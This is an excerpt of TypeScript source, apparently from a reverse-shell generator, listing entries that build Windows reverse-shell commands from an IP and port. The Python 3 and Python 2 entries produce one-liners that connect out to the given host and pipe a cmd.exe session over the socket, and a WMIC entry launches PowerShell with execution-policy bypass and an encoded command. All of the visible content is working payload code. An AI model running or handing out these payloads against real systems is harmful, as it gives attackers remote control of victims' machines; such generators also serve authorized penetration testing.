...
const SHELLS: Shell[] = [
  ...
  { id: 'win-python3', category: 'Windows', label: 'Python 3',                build: (ip, p) => `python -c "import socket,subprocess,threading;s=socket.socket();s.connect(('${ip}',${p}));proc=subprocess.Popen('cmd',stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT);threading.Thread(target=lambda:[s.sendall(b)for b in iter(lambda:proc.stdout.read1(4096),b'')],daemon=True).start();[proc.stdin.write(b+b'\\r\\n')or proc.stdin.flush()for b in iter(lambda:s.recv(4096).rstrip(),b'')]"` },
  { id: 'win-python2', category: 'Windows', label: 'Python 2',                build: (ip, p) => `python -c "import socket,subprocess,threading;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${ip}',${p}));proc=subprocess.Popen('cmd',stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT);threading.Thread(target=lambda:[s.sendall(b)for b in iter(lambda:proc.stdout.read(1),b'')]).start();[proc.stdin.write(b+b'\\r\\n')or proc.stdin.flush()for b in iter(lambda:s.recv(4096).rstrip(),b'')]"` },
  ...
  { id: 'wmic',        category: 'Windows', label: 'WMIC',                    build: (ip, p) => `wmic process call create "powershell -nop -ep bypass -EncodedCommand ${psEncode(PS_INNER(ip, p))}"` },
